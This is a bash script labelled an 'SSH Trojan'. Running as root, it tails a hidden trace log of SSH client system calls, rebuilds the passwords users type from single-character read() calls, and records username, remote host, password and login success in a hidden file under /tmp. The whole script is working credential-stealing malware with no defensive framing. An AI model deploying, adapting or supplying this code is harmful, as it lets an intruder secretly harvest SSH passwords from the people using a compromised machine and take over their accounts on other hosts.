#!/bin/bash

log_file="/tmp/.log_sshtrojan2.txt"
username=""
remote_host=""
password=""

# Root check
if [[ "$EUID" -ne 0 ]]
then
    echo "Root required!"
    exit 1
fi

# Check if the file exist, if not, create it
if ! [ -e $log_file ]
then
    touch $log_file
fi

# echo "SSH Trojan: log username and password"

while true
do
	is_password="false"
    tail -f -n 0 /tmp/.ssh_trojan.log | while read -r line
	do
		# Extract password from log file
		if [[ `echo $line | grep "password"` ]]
		then
			# echo $line
			username=`echo $line | cut -d '"' -f2 | cut -d '@' -f1`
			remote_host=`echo $line | cut -d '"' -f2 | cut -d "'" -f1 | cut -d '@' -f2`
			is_password="true"
		fi
		if [[ `echo $line | grep -w "denied"` ]]
		then
			echo -e " - Incorrect password \n" >> $log_file
		fi
		if [[ `echo $line | grep "Last login"` || `echo $line | grep -w "Welcome"` ]]
		then
			echo -e " - Correct password \n" >> $log_file
		fi
		# Only consider syscall between password section
		# Example:
		# write(4, "user2@192.168.56.101's password: ", 33) = 33
		# read(4, "3", 1) = 1
		# read(4, "m", 1) = 1
		# read(4, "7", 1) = 1
		# read(4, "3", 1) = 1
		# read(4, "a", 1) = 1
		# read(4, "2", 1) = 1
		# read(4, "\n", 1) = 1 --- end of user's input
		# write(4, "\n", 1) = 1 --- end of user's input
		# Above password: 3m73a2
		if [[ $is_password == "true" ]]
		then
			ch=`echo $line | grep read\( | cut -d'"' -f2 | cut -d'"' -f1`
			if [[ $ch == "\\n" || $ch == "\\r" ]]; then
				# echo ${password}
				command_bin_location=`whereis ${password} | awk -F ': ' '{ print $2 }'`
				if [[ $command_bin_location == "" ]]
				then
					echo "Time:" `date` >> $log_file
					echo "Username:" $username  >> $log_file
					echo "Remote host:" $remote_host >> $log_file
					echo -e -n "Password:" $password >> $log_file
				fi
				is_password="false"
				break
			else
				password+=$ch
			fi           
		fi
    done
done


